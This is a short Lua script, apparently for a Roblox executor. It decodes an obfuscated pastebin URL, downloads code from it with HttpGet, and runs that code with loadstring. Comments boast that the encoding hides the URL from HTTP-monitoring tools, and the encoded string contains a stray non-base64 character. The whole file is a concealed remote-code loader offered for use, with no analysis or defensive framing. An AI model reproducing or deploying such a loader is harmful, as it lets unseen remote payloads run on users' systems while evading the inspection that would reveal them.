-- Wait duration before execution
task.wait(3)

-- Self-contained decryption function to mask the URL
local function decrypt(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r, f = '', (b:find(x) - 1)
        for i = 6, 1, -1 do r = r .. (f % 2^i - f % 2^(i-1) > 0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d%d%d%d%d%d', function(x)
        local c = 0
        for i = 1, 8 do c = c + (x:sub(i,i) == '1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Your URL fully encrypted (unreadable to standard HTTP Spies)
local secure_url = decrypt("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3Lz狠ZzhFYXI=")

-- Anti-crash protected call execution
local success, result = pcall(function()
    return game:HttpGet(secure_url)
end)

if success and result then
    local run, err = loadstring(result)
    if run then
        run()
    else
        warn("Internal build error.")
    end
else
    warn("Secure connection failed.")
end
